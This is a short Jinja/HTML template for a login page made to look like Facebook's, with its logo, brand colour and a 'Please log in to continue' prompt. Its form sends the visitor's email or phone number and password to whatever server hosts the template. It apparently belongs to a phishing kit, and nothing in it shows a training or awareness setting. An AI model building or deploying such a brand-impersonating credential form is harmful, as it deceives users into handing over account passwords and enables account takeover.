{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;padding:40px 28px;">
  <div class="platform-header" style="align-items:center;margin-bottom:24px;">
     <div class="icon-circle bg-facebook"><i class="fa-brands fa-facebook icon-lg"></i></div>
      <i class="fa-brands fa-facebook-f icon-lg" style="font-size:30px;"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;font-size:24px;font-weight:700;color:#1877F2;">Facebook</h2>
      <div style="color:#64748b;font-size:14px;">Please log in to continue</div>
    </div>
  </div>

  <form method="post">
    <input 
      class="input" 
      name="address" 
      type="text" 
      placeholder="Mobile number or email address" 
      required
      style="width:100%;padding:14px;font-size:15px;border-radius:10px;margin-bottom:14px;"
    >
    <input 
      class="input" 
      name="password" 
      type="password" 
      placeholder="Password" 
      required
      style="width:100%;padding:14px;font-size:15px;border-radius:10px;margin-bottom:20px;"
    >

    <div class="center">
      <button class="btn btn-blue" type="submit"
        style="width:100%;padding:14px;font-size:16px;font-weight:600;border-radius:8px;">
        Log in
      </button>
    </div>
  </form>
</div>
{% endblock %}
